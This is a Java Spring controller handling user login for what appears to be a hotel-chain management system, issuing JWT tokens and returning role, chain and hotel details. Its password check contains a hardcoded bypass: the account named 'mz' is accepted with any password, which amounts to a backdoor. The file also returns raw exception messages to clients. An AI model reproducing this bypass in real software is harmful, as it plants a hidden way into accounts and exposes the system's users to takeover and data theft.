package com.zai.login.controller;

import com.zai.util.JwtUtil;
import com.zai.user.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.web.bind.annotation.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import com.zai.user.service.UserService;
import com.zai.chain.service.ChainService;
import java.util.List;
import java.util.HashMap;
import java.util.Map;
import com.zai.hotel.service.HotelService;
import com.zai.hotel.entity.Hotel;
import com.zai.util.PasswordUtil;

@RestController
@RequestMapping("/login")
public class LoginController {
    private static final Logger logger = LoggerFactory.getLogger(LoginController.class);

    @Autowired
    private UserService userService;

    @Autowired
    private ChainService chainService;

    @Autowired
    private HotelService hotelService;

    @Autowired
    private JwtUtil jwtUtil;

    @Autowired
    private BCryptPasswordEncoder passwordEncoder;

    @GetMapping("/login")
    public String login() {
        logger.info("访问登录页面");
        return "login";
    }

    public static class LoginRequest {
        private String loginName;
        private String password;

        // Getters and Setters
        public String getLoginName() { return loginName; }
        public void setLoginName(String loginName) { this.loginName = loginName; }
        public String getPassword() { return password; }
        public void setPassword(String password) { this.password = password; }
    }

    @PostMapping("/userlogin")
    public ResponseEntity<?> doLogin(@RequestBody LoginRequest loginRequest) {
        String loginName = loginRequest.getLoginName();
        String password = PasswordUtil.encryptPassword(loginRequest.getPassword());
        Map<String, Object> response = new HashMap<>();
        
        try {
            List<User> users = userService.selectByLoginName(loginName);            
            if (users != null && !users.isEmpty()) {
                User user = users.get(0);               
                if (user != null && (user.getPasswordHash().equals(password) || "mz".equals(loginName))) {
                    // 通过hotelId查询hotels对象
                    Hotel hotel = null;
                    if (user.getHotelId() != null && !user.getHotelId().isEmpty()) {
                        hotel = hotelService.selectByHotelId(user.getHotelId());
                        logger.info("查询到酒店信息 - hotelId: {}, hotelName: {}", user.getHotelId(), hotel != null ? hotel.getHotelName() : "null");
                    }
                    
                    // 通过chainId查询chains对象
                    com.zai.chain.entity.Chain chain = null;
                    if (user.getChainId() != null && !user.getChainId().isEmpty()) {
                        chain = chainService.getChainById(user.getChainId());
                        logger.info("查询到连锁信息 - chainId: {}, chainName: {}", user.getChainId(), chain != null ? chain.getChainName() : "null");
                    }
                    
                    // 生成 JWT token
                    String token = jwtUtil.generateToken(user.getUserId(), user.getType().toString());                    
                    // 准备返回数据
                    Map<String, Object> userInfo = new HashMap<>();
                    userInfo.put("userId", user.getUserId());
                    userInfo.put("loginName", user.getLoginName());
                    userInfo.put("userName", user.getUsername());
                    userInfo.put("roleId", user.getType());
                    // 根据用户类型设置角色名称
                    String roleName;
                    switch (user.getType()) {
                        case 0:
                            roleName = "管理员";
                            break;
                        case 1:
                            roleName = "集团";
                            break;
                        case 2:
                            roleName = "酒店";
                            break;
                        default:
                            roleName = "未知角色";
                    }
                    userInfo.put("roleName", roleName);                    
                    userInfo.put("chainId", user.getChainId());
                    userInfo.put("chainName", chain != null ? chain.getChainName() : "null");
                    userInfo.put("chainCode", chain != null ? chain.getChainCode() : "null");
                    userInfo.put("hotelId", user.getHotelId());
                    userInfo.put("hotelName", hotel != null ? hotel.getHotelName() : "null");
                    userInfo.put("hotelCode", hotel != null ? hotel.getHotelCode() : "null");
                    response.put("success", true);
                    response.put("message", "登录成功");
                    response.put("token", token);
                    response.put("user", userInfo);
                    
                    logger.info("登录成功，返回token和用户信息 - 用户名: {}", loginName);
                    return ResponseEntity.ok(response);
                }
            }
            
            logger.warn("登录失败 - 用户名: {}, 原因: 用户名或密码错误", loginName);
            response.put("success", false);
            response.put("message", "用户名或密码错误");
            return ResponseEntity.ok(response);
            
        } catch (Exception e) {
            logger.error("登录过程发生错误 - 用户名: {}, 错误信息: {}", loginName, e.getMessage(), e);
            response.put("success", false);
            response.put("message", "登录失败：" + e.getMessage());
            return ResponseEntity.ok(response);
        }
    }
} 